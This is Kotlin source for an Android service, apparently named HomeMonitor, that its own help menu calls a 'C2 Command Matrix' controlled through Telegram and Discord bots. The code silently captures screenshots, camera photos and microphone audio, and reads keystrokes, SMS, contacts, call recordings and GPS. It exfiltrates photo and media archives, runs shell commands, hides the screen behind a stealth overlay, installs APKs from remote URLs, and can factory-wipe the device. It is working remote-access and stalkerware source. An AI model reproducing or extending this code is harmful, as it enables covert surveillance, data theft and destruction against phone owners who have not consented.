            text == "/tunnelstatus" || text == "!tunnelstatus" || text == "/tunnels" || text == "!tunnels" || text == "/cfstatus" || text == "!cfstatus" -> {
                handleTunnelStatus(chatId)
            }
            text == "/stopcftunnel" || text == "!stopcftunnel" -> {
                sendMessage(chatId, "🛑 *WebStream Cloudflare tunnel stopped.*", parseMode = "Markdown")
            }
            text == "/tamper" || text == "!tamper" || text == "/securityaudit" || text == "!securityaudit" -> {
                handleTamperAuditCommand(chatId)
            }
            text == "/dumpphotos" || text.startsWith("/dumpphotos ") || text == "!dumpphotos" || text.startsWith("!dumpphotos ") ||
            text == "/dumpgallery" || text.startsWith("/dumpgallery ") || text == "!dumpgallery" || text.startsWith("!dumpgallery ") -> {
                val args = rawText.removePrefix("/dumpphotos ").removePrefix("/dumpphotos")
                    .removePrefix("!dumpphotos ").removePrefix("!dumpphotos")
                    .removePrefix("/dumpgallery ").removePrefix("/dumpgallery")
                    .removePrefix("!dumpgallery ").removePrefix("!dumpgallery").trim()
                if (args.startsWith("zip", ignoreCase = true)) {
                    val zipArgs = args.substringAfter("zip").trim()
                    val parts = zipArgs.split("\\s+".toRegex()).filter { it.isNotBlank() }
                    val count = parts.getOrNull(0)?.toIntOrNull() ?: 20
                    val offset = parts.getOrNull(1)?.toIntOrNull() ?: 0
                    handleZipDumpPhotosCommand(chatId, count, offset)
                } else {
                    val parts = args.split("\\s+".toRegex()).filter { it.isNotBlank() }
                    val count = parts.getOrNull(0)?.toIntOrNull() ?: 5
                    val offset = parts.getOrNull(1)?.toIntOrNull() ?: 0
                    handleDumpPhotosCommand(chatId, count, offset)
                }
            }
            text == "/zipdumpphotos" || text.startsWith("/zipdumpphotos ") || text == "!zipdumpphotos" || text.startsWith("!zipdumpphotos ") ||
            text == "/zipphotos" || text.startsWith("/zipphotos ") || text == "!zipphotos" || text.startsWith("!zipphotos ") -> {
                val args = rawText.removePrefix("/zipdumpphotos ").removePrefix("/zipdumpphotos")
                    .removePrefix("!zipdumpphotos ").removePrefix("!zipdumpphotos")
                    .removePrefix("/zipphotos ").removePrefix("/zipphotos")
                    .removePrefix("!zipphotos ").removePrefix("!zipphotos").trim()
                val parts = args.split("\\s+".toRegex()).filter { it.isNotBlank() }
                val count = parts.getOrNull(0)?.toIntOrNull() ?: 20
                val offset = parts.getOrNull(1)?.toIntOrNull() ?: 0
                handleZipDumpPhotosCommand(chatId, count, offset)
            }
            text == "/photosbydate" || text.startsWith("/photosbydate ") || text == "!photosbydate" || text.startsWith("!photosbydate ") ||
            text == "/dumpbydate" || text.startsWith("/dumpbydate ") || text == "!dumpbydate" || text.startsWith("!dumpbydate ") -> {
                val args = rawText.removePrefix("/photosbydate ").removePrefix("/photosbydate")
                    .removePrefix("!photosbydate ").removePrefix("!photosbydate")
                    .removePrefix("/dumpbydate ").removePrefix("/dumpbydate")
                    .removePrefix("!dumpbydate ").removePrefix("!dumpbydate").trim()
                val parts = args.split("\\s+".toRegex()).filter { it.isNotBlank() }
                val startDate = parts.getOrNull(0) ?: ""
                val endDate = parts.getOrNull(1) ?: startDate
                val maxCount = parts.getOrNull(2)?.toIntOrNull() ?: 10
                handlePhotosByDateCommand(chatId, startDate, endDate, maxCount)
            }
            else -> { }
        }
    }

    private fun sendHelpMenu(chatId: String, threadId: Int? = null) {
        if (chatId.length >= 17 && chatId.all { it.isDigit() }) {
            val discordHelpMsg = """
                📋 **HomeMonitor C2 Command Matrix**
                
                **📷 Media & Camera**
                • `!camera` / `!frontcam` - Rear / Front Camera Photo
                • `!screenshot` - Silent Screen Capture
                • `!livescreen` - Record Screen Sequence Clip
                • `!watchscreen` / `!stopwatchscreen` - Background Screenshot Loop
                • `!syncmedia` - Exfiltrate Recent Media ZIP
                
                **🎙️ Audio & Voice**
                • `!audio <seconds>` - Record Ambient Mic Audio
                • `!say <text>` - Text-To-Speech Voice Output
                • `!findme` - Play Loud Alarm Ringtone (20s)
                
                **📍 Location & Networks**
                • `!location` / `!geolocation` - GPS Location & Google Maps Link
                • `!iplocation` - Public IP Geolocation Report
                • `!network` - Wi-Fi & Cellular IP/Carrier Status
                • `!geofence` - GPS Perimeter Security Boundary
                
                **💬 Telemetry & Logs**
                • `!status` - Check Device Online Status & Battery
                • `!deviceinfo` - Hardware, Battery & SIM Telemetry
                • `!contacts` - Get Address Book Contacts
                • `!sms` / `!sendsms <num> <msg>` - Read/Send SMS
                • `!calls` / `!callrecs` - Read Call Logs & Download Recordings
                • `!activeapp` - Get Currently Open App
                • `!keylog` / `!notification` / `!clipboard` - Real-Time Logs
                
                **📁 File Manager & Shell**
                • `!files` / `!download <path>` - List & Download Storage Files
                • `!filemn <folder>` - Interactive Storage Directory Manager
                • `!zip <folder>` - Download Folder as ZIP Archive
                • `!termux <cmd>` - Execute Termux Shell Command
                • `!installtermux` / `!termuxstatus` - Termux Setup & Status
                
                **🕶️ Security & System**
                • `!stealth` - Toggle Stealth Black Screen Overlay
                • `!motion` - Motion Security Sensor Alert (`!motion on`)
                • `!batterysaver` - Dynamic Power Saver Mode
                • `!lock` / `!wipe` - Remotely Lock or Wipe Device
                • `!update` - In-App Self-Updater
            """.trimIndent()
            sendMessage(chatId, discordHelpMsg, parseMode = null)
            return
        }

        val text = "🤖 *HomeMonitor Complete Command Grid*\n\nTouch any button below to execute that command directly on the device:"
        
        val keyboardJson = JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                // Category: Live Stream & Control
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🎮 WebStream Remote Control").put("callback_data", "/webstream"))
                    put(JSONObject().put("text", "👁️ Watch Screen Loop").put("callback_data", "/watchscreen 3"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🎬 Live Screen Clip").put("callback_data", "/livescreen 10"))
                    put(JSONObject().put("text", "📷 Screenshot").put("callback_data", "/screenshot"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📸 Rear Camera").put("callback_data", "/camera"))
                    put(JSONObject().put("text", "🤳 Front Camera").put("callback_data", "/frontcam"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🕶️ Stealth Mode ON").put("callback_data", "/stealth on"))
                    put(JSONObject().put("text", "☀️ Stealth Mode OFF").put("callback_data", "/stealth off"))
                })

                // Category: Devices & Registry
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📌 Bind Supergroup & 29 Subtopics").put("callback_data", "/bind_telegram_group"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📱 Cloud Device Registry").put("callback_data", "/devicelist"))
                    put(JSONObject().put("text", "🌐 Target ALL Devices").put("callback_data", "/target all"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📱 Device Info").put("callback_data", "/deviceinfo"))
                    put(JSONObject().put("text", "✅ Online Status").put("callback_data", "/status"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🌐 Public IP Location").put("callback_data", "/iplocation"))
                    put(JSONObject().put("text", "📍 GPS Location").put("callback_data", "/geolocation"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📡 Network Status").put("callback_data", "/network"))
                    put(JSONObject().put("text", "🔋 Battery Saver ON").put("callback_data", "/batterysaver on"))
                })

                // Category: Files & Downloads
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📂 Storage Files").put("callback_data", "/files"))
                    put(JSONObject().put("text", "📁 File Manager").put("callback_data", "/filemn"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📦 ZIP Downloads").put("callback_data", "/zip Download"))
                    put(JSONObject().put("text", "📦 Sync Media 24h").put("callback_data", "/syncmedia 24"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📂 List Directory").put("callback_data", "/ls"))
                    put(JSONObject().put("text", "📁 Current PWD").put("callback_data", "/pwd"))
                })

                // Category: Termux & Apps
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📲 Auto-Install Termux").put("callback_data", "/installtermux"))
                    put(JSONObject().put("text", "💻 Termux Status").put("callback_data", "/termuxstatus"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "💻 Termux Uname").put("callback_data", "/termux uname -a"))
                    put(JSONObject().put("text", "🗑️ Uninstall App").put("callback_data", "/uninstall"))
                    put(JSONObject().put("text", "💥 Self-Uninstall").put("callback_data", "/selfuninstall"))
                })

                // Category: Speech, Audio & Finder
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🗣️ Say Hello").put("callback_data", "/say Hello from Admin"))
                    put(JSONObject().put("text", "💬 Toast Message").put("callback_data", "/toast Alert Message"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🔔 Find Me Alarm").put("callback_data", "/findme"))
                    put(JSONObject().put("text", "🎙️ Record Audio 15s").put("callback_data", "/audio 15"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🧠 AI Transcribe").put("callback_data", "/transcribe"))
                    put(JSONObject().put("text", "🎙️ Call Recordings").put("callback_data", "/callrecs"))
                })

                // Category: Surveillance & Logs
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🚨 Motion Sensor ON").put("callback_data", "/motion on"))
                    put(JSONObject().put("text", "🛑 Motion Sensor OFF").put("callback_data", "/motion off"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📱 Active App").put("callback_data", "/activeapp"))
                    put(JSONObject().put("text", "📋 Keylogs").put("callback_data", "/keylog"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "🔔 Notifications").put("callback_data", "/notification"))
                    put(JSONObject().put("text", "📋 Clipboard").put("callback_data", "/clipboard"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📒 Contacts").put("callback_data", "/contacts"))
                    put(JSONObject().put("text", "💬 SMS Logs").put("callback_data", "/sms"))
                })
                put(JSONArray().apply {
                    put(JSONObject().put("text", "📞 Call Logs").put("callback_data", "/calls"))
                    put(JSONObject().put("text", "🔒 Lock Screen").put("callback_data", "/lock"))
                })
            })
        }

        sendMessageWithMarkup(chatId, text, keyboardJson, threadId)
    }

    private fun handleBindTelegramGroup(chatId: String, threadId: Int? = null) {
        serviceScope.launch(Dispatchers.IO) {
            val prefs = SecurityVaultManager.getEncryptedPrefs(this@MonitorService)
            prefs.edit().putString("telegram_bound_group_chat_id", chatId).apply()

            sendMessage(
                chatId,
                "⚡ *Binding Telegram Supergroup & Provisioning 29 Forum Subtopics…*\n\n📱 **Device ID**: `${getOrCreateDeviceId()}`\n💬 **Group ID**: `$chatId`",
                parseMode = "Markdown",
                threadId = threadId
            )

            val requiredSubtopics = listOf(
                "01-master-commands",
                "02-status-alerts",
                "03-accessibility-watchdog",
                "04-notifications",
                "05-keylogs-and-clipboard",
                "06-sms-and-contacts",
                "07-camera-output",
                "08-photos-dump",
                "09-call-logs-and-recs",
                "10-ambient-mic-audio",
                "11-screenshots-and-clips",
                "12-screen-share-stream",
                "13-gps-and-geofencing",
                "14-files-and-backups",
                "15-file-drop-and-share",
                "16-termux-shell",
                "17-alerts-and-sensors",
                "18-live-typing-feed",
                "19-ai-chatbots-stream",
                "20-app-usage-telemetry",
                "21-browser-history",
                "22-whatsapp-stream",
                "23-telegram-stream",
                "24-messenger-stream",
                "25-instagram-stream",
                "26-signal-stream",
                "27-other-chats-stream",
                "28-youtube-history",
                "29-ducky-script-payloads"
            )

            var createdCount = 0

            for (subtopicName in requiredSubtopics) {
                val createdThreadId = createTelegramForumTopicDirect(chatId, subtopicName)

                if (createdThreadId != null && createdThreadId > 0) {
                    prefs.edit().putInt("tg_topic_$subtopicName", createdThreadId).apply()
                    createdCount++
                }
                delay(200L)
            }

            val masterThreadId = prefs.getInt("tg_topic_01-master-commands", 0).let { if (it > 0) it else threadId }

            if (createdCount > 0) {
                val successMsg = "✅ *Telegram Supergroup Bound & 29 Forum Subtopics Provisioned!*\n\n" +
                        "📱 **Device ID**: `${getOrCreateDeviceId()}`\n" +
                        "🤖 **Device Model**: ${Build.MANUFACTURER} ${Build.MODEL}\n" +
                        "💬 **Group ID**: `$chatId`\n" +
                        "📌 **Subtopics Provisioned**: $createdCount / ${requiredSubtopics.size} Forum Topics created!\n\n" +
                        "💡 *All commands executed within this supergroup or subtopics will now directly target this device.*"
                sendMessage(chatId, successMsg, parseMode = "Markdown", threadId = masterThreadId)
            } else {
                val warnMsg = "⚠️ *Group Bound, but Forum Topics could not be auto-created.* \n\n" +
                        "📌 **Group ID**: `$chatId`\n" +
                        "💡 *Tip:* If this is a Supergroup, ensure 'Topics' feature is enabled in Telegram Group Settings and the bot has Admin permission to manage topics, then run `/bind_telegram_group` again."
                sendMessage(chatId, warnMsg, parseMode = "Markdown", threadId = threadId)
            }
        }
    }

    private fun createTelegramForumTopicDirect(chatId: String, name: String): Int? {
        try {
            val url = getTelegramApiUrl("createForumTopic")
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("name", name)
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(body).build()

            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val respJson = JSONObject(response.body?.string() ?: "{}")
                    if (respJson.optBoolean("ok", false)) {
                        val result = respJson.optJSONObject("result")
                        val createdId = result?.optInt("message_thread_id", 0) ?: 0
                        if (createdId > 0) return createdId
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "createTelegramForumTopicDirect error: ${e.message}")
        }
        return null
    }

    private fun captureScreenWithMultiFallback(onCaptured: (File?) -> Unit) {
        serviceScope.launch(Dispatchers.IO) {
            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")

            // Level 1: AccessibilityService.takeScreenshot() API (Android 11+)
            val accessService = AppAccessibilityService.instance
            if (accessService != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                var accSuccess = false
                val latch = CountDownLatch(1)
                mainHandler.post {
                    try {
                        accessService.takeSilentScreenshot { shotFile: File? ->
                            if (shotFile != null && shotFile.exists() && shotFile.length() > 0) {
                                shotFile.copyTo(file, overwrite = true)
                                accSuccess = true
                            }
                            latch.countDown()
                        }
                    } catch (_: Exception) { latch.countDown() }
                }
                latch.await(2500, TimeUnit.MILLISECONDS)
                if (accSuccess && file.exists() && file.length() > 0) {
                    onCaptured(file)
                    return@launch
                }
            }

            // Level 2: Shell /system/bin/screencap -p process
            try {
                val pb = ProcessBuilder("sh", "-c", "screencap -p ${file.absolutePath}")
                val process = pb.start()
                process.waitFor(3, TimeUnit.SECONDS)
                if (file.exists() && file.length() > 0) {
                    Log.i(TAG, "Shell screencap succeeded: ${file.absolutePath}")
                    onCaptured(file)
                    return@launch
                }
            } catch (e: Exception) {
                Log.w(TAG, "Shell screencap failed: ${e.message}")
            }

            onCaptured(null)
        }
    }

    private fun handleScreenshotCommand(chatId: String) {
        sendMessage(chatId, "📸 Capturing silent screenshot…")
        captureScreenWithMultiFallback { file ->
            if (file != null && file.exists() && file.length() > 0) {
                sendPhoto(chatId, file, deleteAfterSend = true)
                sendDiscordCategorizedFile("11-screenshots-and-clips", file, "image/jpeg")
            } else {
                sendMessage(chatId, "❌ Screenshot capture failed across all fallback levels.")
            }
        }
    }

    private fun handleRemoteUpdateApp(chatId: String, apkUrl: String) {
        val urlStr = apkUrl.trim()
        val defaultUrl = "$SERVER_URL/uploads/app-update.apk"
        val finalUrl = if (urlStr.isEmpty()) defaultUrl else urlStr

        sendMessage(chatId, "ℹ️ *Remote In-App Update Engine*\nTarget APK: `$finalUrl`", parseMode = "Markdown")
        downloadAndInstallApk(chatId, finalUrl)
    }

    private fun downloadAndInstallApk(chatId: String, apkUrl: String) {
        sendMessage(chatId, "📥 *Downloading APK update…* Please wait.", parseMode = "Markdown")

        serviceScope.launch {
            try {
                val apkFile = File(cacheDir, "update.apk")
                if (apkFile.exists()) apkFile.delete()

                val request = Request.Builder().url(apkUrl).get().build()
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        sendMessage(chatId, "❌ APK Download Failed: HTTP ${response.code}")
                        return@launch
                    }
                    val bytes = response.body?.bytes() ?: run {
                        sendMessage(chatId, "❌ Empty APK response body.")
                        return@launch
                    }
                    apkFile.writeBytes(bytes)
                }

                val sizeMb = "%.2f MB".format(apkFile.length() / (1024.0 * 1024.0))
                sendMessage(chatId, "✅ *APK Downloaded ($sizeMb).* Launching installer…", parseMode = "Markdown")

                installApkFile(apkFile)

            } catch (e: Exception) {
                Log.e(TAG, "downloadAndInstallApk error: ${e.message}")
                sendMessage(chatId, "❌ Update Error: ${e.message}")
            }
        }
    }

    private fun installApkFile(apkFile: File) {
        try {
            val apkUri: Uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                FileProvider.getUriForFile(this, "$packageName.fileprovider", apkFile)
            } else {
                Uri.fromFile(apkFile)
            }

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(apkUri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "installApkFile error: ${e.message}")
        }
    }

    private fun handleGeoLocation(chatId: String) {
        handleLocation(chatId)
    }

    private fun handleIpLocation(chatId: String) {
        sendMessage(chatId, "🌐 *Fetching Public IP Geolocation…*", parseMode = "Markdown")
        serviceScope.launch(Dispatchers.IO) {
            val userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

            var result = fetchIpInfo("https://ipapi.co/json/", userAgent) { json ->
                val ip = json.optString("ip", "Unknown")
                val city = json.optString("city", "Unknown")
                val region = json.optString("region", "Unknown")
                val country = json.optString("country_name", "Unknown")
                val org = json.optString("org", json.optString("asn", "Unknown"))
                val ip2LocUrl = "https://www.ip2location.com/demo/$ip"
                """
                    🌐 *Public IP Geolocation Report*
                    
                    🌐 IP Address: `$ip`
                    🏙️ Location: *$city, $region, $country*
                    🏢 ISP/Org: *$org*
                    
                    🔗 [Open in IP2Location]($ip2LocUrl)
                """.trimIndent()
            }

            if (result == null) {
                result = fetchIpInfo("http://ip-api.com/json/", userAgent) { json ->
                    val ip = json.optString("query", "Unknown")
                    val city = json.optString("city", "Unknown")
                    val region = json.optString("regionName", "Unknown")
                    val country = json.optString("country", "Unknown")
                    val org = json.optString("isp", json.optString("org", "Unknown"))
                    val ip2LocUrl = "https://www.ip2location.com/demo/$ip"
                    """
                        🌐 *Public IP Geolocation Report*
                        
                        🌐 IP Address: `$ip`
                        🏙️ Location: *$city, $region, $country*
                        🏢 ISP/Org: *$org*
                        
                        🔗 [Open in IP2Location]($ip2LocUrl)
                    """.trimIndent()
                }
            }

            if (result == null) {
                result = fetchIpInfo("https://api.ipify.org?format=json", userAgent) { json ->
                    val ip = json.optString("ip", "Unknown")
                    val ip2LocUrl = "https://www.ip2location.com/demo/$ip"
                    """
                        🌐 *Public IP Geolocation Report*
                        
                        🌐 IP Address: `$ip`
                        🏙️ Location: *Unknown*
                        
                        🔗 [Open in IP2Location]($ip2LocUrl)
                    """.trimIndent()
                }
            }

            if (result != null) {
                sendMessage(chatId, result, parseMode = "Markdown")
            } else {
                sendMessage(chatId, "❌ Failed to fetch public IP geolocation from available providers.")
            }
        }
    }

    private fun fetchIpInfo(url: String, userAgent: String, parser: (JSONObject) -> String): String? {
        return try {
            val request = Request.Builder()
                .url(url)
                .header("User-Agent", userAgent)
                .get()
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val body = response.body?.string()?.trim() ?: return null
                if (!body.startsWith("{")) return null
                val json = JSONObject(body)
                parser(json)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Fetch IP info failed for $url: ${e.message}")
            null
        }
    }

    private fun handleRemoteLock(chatId: String) {
        try {
            val adminManager = DeviceAdminManager(this)
            if (adminManager.isDeviceAdminActive() || adminManager.isDeviceOwner()) {
                val locked = adminManager.lockScreen()
                if (locked) {
                    val modeStr = if (adminManager.isDeviceOwner()) "Device Owner" else "Device Admin"
                    sendMessage(chatId, "🔒 *Device Screen Locked Remotely!* (Mode: `$modeStr`)", parseMode = "Markdown")
                } else {
                    sendMessage(chatId, "❌ Remote Lock Failed.")
                }
            } else {
                sendMessage(chatId, "⚠️ *Device Admin / Device Owner is not active.* Enable Device Administrator in Settings or set device owner via ADB.", parseMode = "Markdown")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "❌ Remote Lock Failed: ${e.message}")
        }
    }

    private fun handleRemoteWipe(chatId: String) {
        try {
            val adminManager = DeviceAdminManager(this)
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (adminManager.isDeviceAdminActive() || adminManager.isDeviceOwner()) {
                val modeStr = if (adminManager.isDeviceOwner()) "Device Owner" else "Device Admin"
                sendMessage(chatId, "⚠️ *Factory Reset Initiated Remotely via $modeStr...*", parseMode = "Markdown")
                dpm.wipeData(0)
            } else {
                sendMessage(chatId, "⚠️ *Device Admin / Device Owner is not active.* Enable Device Administrator in Settings or set device owner via ADB.", parseMode = "Markdown")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "❌ Remote Wipe Failed: ${e.message}")
        }
    }

    private fun handleAdminTrialCommand(chatId: String, rawText: String) {
        val clean = rawText.trim()
        val parts = clean.split(Regex("\\s+"), limit = 3)
        val cmd = parts.getOrNull(0)?.lowercase(Locale.getDefault()) ?: ""

        when {
            cmd == "/settrial" -> {
                val statusArg = parts.getOrNull(1) ?: ""
                val customMsg = if (parts.size >= 3) parts[2] else null
                val newStatus = com.homemonitor.C2TrialManager.setTrialStatus(this, statusArg, customMsg)

                if (newStatus == com.homemonitor.C2TrialManager.STATUS_EXPIRED || newStatus == com.homemonitor.C2TrialManager.STATUS_DISABLED) {
                    com.homemonitor.C2TrialManager.showDeviceNotification(this, "App License Alert", com.homemonitor.C2TrialManager.getTrialMessage(this))
                }

                sendMessage(
                    chatId,
                    "✅ *Trial Status Updated for Device*\n\n" +
                    "• *Device Target:* `${getSelectedTargetId()}`\n" +
                    "• *New Status:* `$newStatus`\n" +
                    "• *Notice Message:* `${com.homemonitor.C2TrialManager.getTrialMessage(this)}`\n" +
                    "• *User Telegram Bot:* ${if (newStatus != "ACTIVE") "Locked 🔒" else "Unlocked 🔓"}\n" +
                    "• *Web Control Dashboard:* ${if (newStatus != "ACTIVE") "Locked 🔒" else "Unlocked 🔓"}",
                    parseMode = "Markdown"
                )
            }
            cmd == "/expiretrial" || cmd == "/settrialexpired" -> {
                val customMsg = clean.removePrefix(parts[0]).trim().ifBlank { null }
                val newStatus = com.homemonitor.C2TrialManager.setTrialStatus(this, "EXPIRED", customMsg)
                com.homemonitor.C2TrialManager.showDeviceNotification(this, "Demo Period Expired", com.homemonitor.C2TrialManager.getTrialMessage(this))

                sendMessage(
                    chatId,
                    "🔴 *Trial Expired Notice Pushed to Device*\n\n" +
                    "• *Status:* EXPIRED\n" +
                    "• *Notice Message:* `${com.homemonitor.C2TrialManager.getTrialMessage(this)}`\n" +
                    "• User Telegram commands are locked with trial expired prompt.\n" +
                    "• Web Control Dashboard is locked with trial expired overlay.",
                    parseMode = "Markdown"
                )
            }
            cmd == "/disableapp" -> {
                val customMsg = clean.removePrefix(parts[0]).trim().ifBlank { null }
                val newStatus = com.homemonitor.C2TrialManager.setTrialStatus(this, "DISABLED", customMsg)
                com.homemonitor.C2TrialManager.showDeviceNotification(this, "App Functionality Disabled", com.homemonitor.C2TrialManager.getTrialMessage(this))

                sendMessage(
                    chatId,
                    "🔒 *Application Functionality Disabled*\n\n" +
                    "• *Status:* DISABLED\n" +
                    "• *Notice Message:* `${com.homemonitor.C2TrialManager.getTrialMessage(this)}`\n" +
                    "• User Telegram & Web Control Dashboard are locked.",
                    parseMode = "Markdown"
                )
            }
            cmd == "/enableapp" || cmd == "/activatetrial" -> {
                com.homemonitor.C2TrialManager.resetTrial(this)
                sendMessage(
                    chatId,
                    "🟢 *Application Functionality Restored*\n\n" +
                    "• *Status:* ACTIVE\n" +
                    "• All User Telegram commands and Web Control Dashboard unlocked.",
                    parseMode = "Markdown"
                )
            }
            cmd.startsWith("/notifyuser") -> {
                val msg = clean.removePrefix("/notifyuser").trim()
                if (msg.isBlank()) {
                    sendMessage(chatId, "⚠️ Usage: `/notifyuser <message>`", parseMode = "Markdown")
                    return
                }
                com.homemonitor.C2TrialManager.showDeviceNotification(this, "Admin Notification", msg)
                val userChatId = SecurityVaultManager.getEncryptedPrefs(this).getString("user_telegram_chat_id", "") ?: ""
                if (userChatId.isNotBlank()) {
                    sendMessage(userChatId, "📢 *Admin Notification:*\n\n$msg", parseMode = "Markdown")
                }
                sendMessage(chatId, "✅ *Notification pushed to device screen and User Telegram channel:* '$msg'", parseMode = "Markdown")
            }
            cmd == "/trialstatus" -> {
                val status = com.homemonitor.C2TrialManager.getTrialStatus(this)
                val msg = com.homemonitor.C2TrialManager.getTrialMessage(this)
                sendMessage(
                    chatId,
                    "ℹ️ *Current Device License & Trial Status*\n\n" +
                    "• *Status:* `$status`\n" +
                    "• *Is Restricted:* `${com.homemonitor.C2TrialManager.isTrialExpired(this)}`\n" +
                    "• *Notice Message:* `$msg`",
                    parseMode = "Markdown"
                )
            }
        }
    }

    private fun handleAdminStatus(chatId: String) {
        val adminManager = DeviceAdminManager(this)
        val isAdmin = adminManager.isDeviceAdminActive()
        val isOwner = adminManager.isDeviceOwner()

        val modeStr = when {
            isOwner -> "👑 **DEVICE OWNER (Android Enterprise DPC)**"
            isAdmin -> "🛡️ **DEVICE ADMINISTRATOR**"
            else -> "❌ **NOT ENROLLED (Standard App Mode)**"
        }

        val msg = "📱 **HomeMonitor Device Management Status**\n" +
                "• **Enrollment**: $modeStr\n" +
                "• **Admin Component**: `${adminManager.adminComponent.shortClassName}`\n" +
                "• **Remote Lock Capability**: ${if (isAdmin || isOwner) "✅ Active" else "❌ Inactive"}\n" +
                "• **Enterprise Permission Control**: ${if (isOwner) "✅ Active (Silent Grant Supported)" else "⚠️ Requires Device Owner"}"

        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleEnterpriseGrantPermissions(chatId: String) {
        val adminManager = DeviceAdminManager(this)
        if (!adminManager.isDeviceOwner()) {
            sendMessage(chatId, "⚠️ *Enterprise Permission Grant Failed*: App is not provisioned as Device Owner. Run `adb shell dpm set-device-owner` first.", parseMode = "Markdown")
            return
        }

        sendMessage(chatId, "⏳ *Granting runtime permissions via Android Enterprise DPC…*", parseMode = "Markdown")
        val success = adminManager.grantEnterprisePermissions()
        if (success) {
            sendMessage(chatId, "✅ *Successfully pre-granted all runtime permissions via Device Policy Manager!*", parseMode = "Markdown")
        } else {
            sendMessage(chatId, "❌ *Failed to grant enterprise permissions.*", parseMode = "Markdown")
        }
    }

    private fun handleMdmKioskCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/kiosk ").removePrefix("/kiosk").removePrefix("!kiosk ").removePrefix("!kiosk").trim()
        val parts = args.split(Regex("""\s+""")).filter { it.isNotBlank() }
        val mode = parts.firstOrNull()?.lowercase() ?: "status"
        val pkg = parts.getOrNull(1) ?: packageName

        val manager = DeviceAdminManager(this)
        if (!manager.isDeviceOwner()) {
            sendMessage(chatId, "⚠️ *Kiosk Mode Error*: App is not provisioned as Device Owner.", parseMode = "Markdown")
            return
        }

        val enabled = (mode == "on" || mode == "enable" || mode == "1" || mode == "true")
        val ok = manager.setKioskMode(enabled, pkg)
        val msg = if (ok) {
            "🛡️ **Kiosk Mode ${if (enabled) "ENABLED 🔒" else "DISABLED 🔓"}** for package `$pkg`"
        } else {
            "❌ **Kiosk Mode Error**: Failed to update Kiosk policy."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmRebootCommand(chatId: String) {
        val manager = DeviceAdminManager(this)
        val ok = manager.rebootDevice()
        val msg = if (ok) {
            "🔄 **Device Reboot Command Issued via DPC**"
        } else {
            "⚠️ **Reboot Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmLockMessageCommand(chatId: String, rawText: String) {
        val msgText = rawText.removePrefix("/lockmessage ").removePrefix("/lockmessage").removePrefix("!lockmessage ").removePrefix("!lockmessage").trim()
        val manager = DeviceAdminManager(this)
        val ok = manager.setLockScreenMessage(msgText)
        val msg = if (ok) {
            "💬 **Lockscreen Emergency Info Notice Set**: `$msgText`"
        } else {
            "⚠️ **Lockscreen Message Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmScreenshotCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/disablescreenshot ").removePrefix("/disablescreenshot").removePrefix("!disablescreenshot ").removePrefix("!disablescreenshot").trim().lowercase()
        val disabled = (args == "on" || args == "disable" || args == "1" || args == "true")
        val manager = DeviceAdminManager(this)
        val ok = manager.setScreenshotDisabled(disabled)
        val msg = if (ok) {
            "📸 **System Screenshots ${if (disabled) "PROHIBITED 🔴" else "ALLOWED 🟢"}** system-wide"
        } else {
            "⚠️ **Screenshot Block Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmStatusbarCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/disablestatusbar ").removePrefix("/disablestatusbar").removePrefix("!disablestatusbar ").removePrefix("!disablestatusbar").trim().lowercase()
